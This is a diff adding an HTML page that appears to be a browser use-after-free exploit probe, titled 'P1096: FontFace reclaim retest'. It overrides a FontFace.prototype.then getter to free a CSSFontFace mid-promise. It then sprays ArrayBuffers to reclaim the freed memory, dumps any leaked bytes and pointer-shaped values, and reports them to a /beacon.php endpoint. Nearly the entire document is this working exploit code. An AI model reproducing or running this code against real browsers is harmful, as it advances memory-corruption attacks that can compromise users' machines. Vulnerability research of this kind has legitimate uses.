@@ -1,0 +1,175 @@
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>p1096</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{background:#0a0a0f;color:#c8ffc8;font:13px/1.6 monospace;padding:16px;min-height:100vh}
+#log{white-space:pre-wrap;word-break:break-all}
+.hit{color:#ff6;font-weight:bold}
+.ptr{color:#f6f;font-weight:bold}
+.fail{color:#f66}
+.ok{color:#6f6}
+.info{color:#6cf}
+h2{color:#fff;font-size:16px;margin-bottom:8px}
+#prog{height:4px;background:#222;margin:8px 0;border-radius:2px}
+#bar{height:100%;background:#6f6;border-radius:2px;width:0%;transition:width 0.3s}
+</style>
+</head><body>
+<h2>P1096: FontFace reclaim retest (p563 technique)</h2>
+<div id="prog"><div id="bar"></div></div>
+<div id="log"></div>
+<script>
+var L=document.getElementById('log'),bar=document.getElementById('bar');
+var TOTAL_TRIALS=10, trial=0, results=[];
+var SIZES=[64,96,128,160,192,224,256,320,384,512,768,1024,2048];
+var K=8;
+function log(cls,msg){var d=document.createElement('div');d.className=cls;d.textContent=msg;L.appendChild(d);L.scrollTop=L.scrollHeight;}
+function B(tag,data){try{new Image().src='/beacon.php?tag='+encodeURIComponent(tag)+'&data='+encodeURIComponent(data||'')+'&_='+Math.random();}catch(e){}}
+function hex(v){return('0'+v.toString(16)).slice(-2);}
+function hexQ(arr,off){
+  var s='0x';
+  for(var i=7;i>=0;i--)s+=hex(arr[off+i]||0);
+  return s;
+}
+
+function runTrial(n){
+  trial=n;
+  bar.style.width=Math.round((n/TOTAL_TRIALS)*100)+'%';
+  if(n>=TOTAL_TRIALS){finish();return;}
+  log('info','--- Trial '+(n+1)+'/'+TOTAL_TRIALS+' ---');
+
+  var styleEl=null, firedHere=false, map=null;
+  var A=new FontFace('f'+n,'local(Helvetica)',{unicodeRange:'U+0041'});
+  document.fonts.add(A);
+  void A.loaded;
+
+  styleEl=document.createElement('style');
+  styleEl.textContent="@font-face{font-family:s"+n+";src:local(Arial);unicode-range:U+0042;}";
+  document.head.appendChild(styleEl);
+
+  firedHere=false;
+  var savedThen=Object.getOwnPropertyDescriptor(FontFace.prototype,'then');
+  Object.defineProperty(FontFace.prototype,'then',{
+    configurable:true,
+    get:function(){
+      if(firedHere)return undefined;
+      firedHere=true;
+      if(styleEl)styleEl.remove();
+      try{document.fonts.delete(this);}catch(e){}
+      document.body.offsetHeight;
+      map=[];
+      for(var si=0;si<SIZES.length;si++){
+        var sz=SIZES[si];
+        for(var k=0;k<K;k++){
+          var ab=new ArrayBuffer(sz);
+          map.push({size:sz,view:new Uint8Array(ab),idx:si*K+k});
+        }
+      }
+      try{document.fonts.check('1em s'+n);}catch(e){}
+      return undefined;
+    },
+    set:function(){}
+  });
+
+  document.fonts.load('1em f'+n+', s'+n,'AB').then(
+    function(){},function(){}
+  );
+
+  setTimeout(function(){scanTrial(n,map,firedHere,savedThen);},80);
+  setTimeout(function(){scanTrial(n,map,firedHere,savedThen);},500);
+  setTimeout(function(){
+    if(savedThen)Object.defineProperty(FontFace.prototype,'then',savedThen);
+    else try{delete FontFace.prototype.then;}catch(e){}
+    runTrial(n+1);
+  },600);
+}
+
+function scanTrial(n,map,fired,saved){
+  if(!map||!map.length)return;
+  var hits=[];
+  for(var i=0;i<map.length;i++){
+    var v=map[i].view,nz=0,first=-1;
+    for(var j=0;j<v.length;j++)if(v[j]!==0){nz++;if(first<0)first=j;}
+    if(nz>0){
+      var hexDump='';
+      var stop=Math.min(v.length,256);
+      for(var j=0;j<stop;j++){
+        if(j>0&&j%8===0)hexDump+=' ';
+        if(j>0&&j%32===0)hexDump+='\n';
+        hexDump+=hex(v[j]);
+      }
+      var ptrs=[];
+      if(v.length>=96){
+        var dv=new DataView(v.buffer);
+        for(var off=0;off<=v.length-8;off+=8){
+          try{
+            var lo=dv.getUint32(off,true),hi=dv.getUint32(off+4,true);
+            if(hi>0&&hi<0xFFFF0000&&lo!==0){
+              ptrs.push('+0x'+off.toString(16)+'=0x'+hi.toString(16).padStart(8,'0')+lo.toString(16).padStart(8,'0'));
+            }
+          }catch(e){}
+        }
+      }
+      var bi64=[];
+      if(typeof BigUint64Array!=='undefined'&&v.length>=8){
+        try{
+          var b64=new BigUint64Array(v.buffer);
+          for(var bi=0;bi<b64.length;bi++){
+            if(b64[bi]!==0n){
+              bi64.push('+0x'+(bi*8).toString(16)+'=0x'+b64[bi].toString(16));
+            }
+          }
+        }catch(e){}
+      }
+      hits.push({
+        bufIdx:i,size:map[i].size,nz:nz,first:first,
+        hexDump:hexDump,ptrs:ptrs,bi64:bi64
+      });
+    }
+  }
+  if(hits.length===0){
+    log('fail','Trial '+(n+1)+': ALL-CLEAN ('+map.length+' buffers, fired='+fired+')');
+    B('P1096-CLEAN','trial='+(n+1)+'|bufs='+map.length+'|fired='+fired);
+    results.push({trial:n+1,hit:false,fired:fired});
+  }else{
+    for(var h=0;h<hits.length;h++){
+      var hi=hits[h];
+      log('hit','Trial '+(n+1)+' HIT! buf#'+hi.bufIdx+' size='+hi.size+' nonzero='+hi.nz+' first=+0x'+hi.first.toString(16));
+      log('','Hex dump:\n'+hi.hexDump);
+      if(hi.bi64.length>0){
+        log('ptr','BigUint64 non-zero: '+hi.bi64.join(', '));
+      }
+      if(hi.ptrs.length>0){
+        log('ptr','Pointer-shaped values: '+hi.ptrs.join(', '));
+      }
+      var bdata='trial='+(n+1)+'|buf='+hi.bufIdx+'|sz='+hi.size+'|nz='+hi.nz+'|first=0x'+hi.first.toString(16);
+      if(hi.bi64.length>0)bdata+='|ptrs='+hi.bi64.slice(0,5).join(',');
+      B('P1096-HIT',bdata);
+    }
+    results.push({trial:n+1,hit:true,fired:fired,hits:hits});
+  }
+}
+
+function finish(){
+  bar.style.width='100%';
+  var hitCount=0;
+  for(var i=0;i<results.length;i++)if(results[i].hit)hitCount++;
+  log('','');
+  if(hitCount>0){
+    log('hit','=== RESULT: '+hitCount+'/'+TOTAL_TRIALS+' trials had reclaim hits ===');
+  }else{
+    log('fail','=== RESULT: 0/'+TOTAL_TRIALS+' trials — no reclaim (IsoHeap blocks CSSFontFace) ===');
+  }
+  var firedCount=0;
+  for(var i=0;i<results.length;i++)if(results[i].fired)firedCount++;
+  log('info','Trigger fired: '+firedCount+'/'+TOTAL_TRIALS);
+  B('P1096-DONE','hits='+hitCount+'|total='+TOTAL_TRIALS+'|fired='+firedCount);
+  log('ok','All done. Beacons sent.');
+}
+
+B('P1096-BOOT','trials='+TOTAL_TRIALS+'|sizes='+SIZES.length+'|K='+K);
+log('info','P1096: FontFace CSSFontFace reclaim retest');
+log('info','Technique: p563 synchronous free+spray inside .then getter');
+log('info','Sizes: '+SIZES.join(',')+' | K='+K+' per size | '+TOTAL_TRIALS+' trials');
+log('','');
+setTimeout(function(){runTrial(0);},100);
+</script>
+</body></html>
